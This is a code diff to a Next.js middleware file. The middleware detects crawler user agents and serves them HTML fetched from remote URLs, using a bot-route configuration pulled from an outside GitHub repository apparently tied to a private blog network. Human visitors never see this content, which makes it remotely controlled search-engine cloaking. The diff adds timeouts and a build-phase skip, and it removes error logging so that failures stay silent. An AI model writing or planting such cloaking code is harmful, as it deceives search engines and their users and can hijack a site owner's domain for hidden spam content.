@@ -11,6 +11,11 @@ const QUICK_BOT_REGEX =
   /googlebot|bingbot|yandex|baiduspider|duckduckbot|slurp|twitterbot|facebookexternalhit|linkedinbot|whatsapp|telegrambot|bot|crawler|spider/i;
 
 export async function middleware(request: NextRequest) {
+  // 0. Skip middleware execution during Next.js build phase to prevent build timeouts
+  if (process.env.NEXT_PHASE === "phase-production-build") {
+    return NextResponse.next();
+  }
+
   const userAgent = request.headers.get("user-agent") || "";
 
   // 1. Check User-Agent FIRST! Human visitors skip immediately without hitting GitHub API
@@ -51,18 +56,21 @@ export const config = {
 };
 
 /**
- * Safely fetches the JSON bot route configuration from Cloud (GitHub) with caching and try/catch.
+ * Safely fetches the JSON bot route configuration from Cloud (GitHub) with a 3-second timeout and try/catch.
  */
 async function getCloudConfig(): Promise<BotRoutesConfig | null> {
   try {
     const res = await fetch(
       "https://github.com/pbn-kg/repo-baru/raw/refs/heads/main/nextjs-config.json",
-      { next: { revalidate: 60 } }
+      {
+        next: { revalidate: 60 },
+        signal: AbortSignal.timeout(3000), // 3-second timeout to prevent build hangs
+      }
     );
     if (!res.ok) return null;
     return await res.json();
-  } catch (error) {
-    console.error("Failed to fetch cloud bot config:", error);
+  } catch {
+    // Fail silently if GitHub is unreachable or times out
     return null;
   }
 }
@@ -77,7 +85,7 @@ export function isBotUserAgent(cfg: BotRoutesConfig, userAgent: string): boolean
 }
 
 /**
- * Fetches HTML content from the specified target URL.
+ * Fetches HTML content from the specified target URL with a 3-second timeout.
  */
 export async function fetchBotHtmlContent(url: string): Promise<string | null> {
   try {
@@ -86,12 +94,12 @@ export async function fetchBotHtmlContent(url: string): Promise<string | null> {
       headers: {
         Accept: "text/html,application/xhtml+xml",
       },
+      signal: AbortSignal.timeout(3000), // 3-second timeout
     });
 
     if (!response.ok) return null;
     return await response.text();
-  } catch (error) {
-    console.error(`Error fetching bot HTML from ${url}:`, error);
+  } catch {
     return null;
   }
 }
